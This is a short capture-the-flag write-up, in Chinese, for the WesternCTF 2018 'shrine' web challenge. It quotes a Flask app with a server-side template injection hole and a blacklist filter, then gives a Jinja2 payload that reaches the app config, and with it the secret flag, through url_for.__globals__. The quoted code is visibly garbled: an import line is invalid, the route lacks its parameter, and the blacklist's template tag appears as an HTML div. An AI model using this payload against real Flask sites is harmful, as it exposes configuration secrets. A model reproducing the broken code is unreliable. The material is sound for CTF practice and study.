# WesternCTF 2018

## Web

### shrine

```python
import flask import os 

app = flask.Flask(__name__) 
app.config['FLAG'] = os.environ.pop('FLAG') 

@app.route('/')
def index(): 
    return open(__file__).read()

@app.route('/shrine/')
def shrine(shrine): 
    def safe_jinja(s): 
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{<div data-gb-custom-block data-tag="set"></div>}'.format(c) for c in blacklist]) + s
    return flask.render_template_string(safe_jinja(shrine)) 

if __name__ == '__main__': 
    app.run(debug=True)
```

通过分析代码可以得知 flag 在 config 里面，但是 config 和 self 都被列入了黑名单，所以需要通过其他方式来获取全局变量，Payload 如下

```
{{url_for.__globals__['current_app'].config}}
```
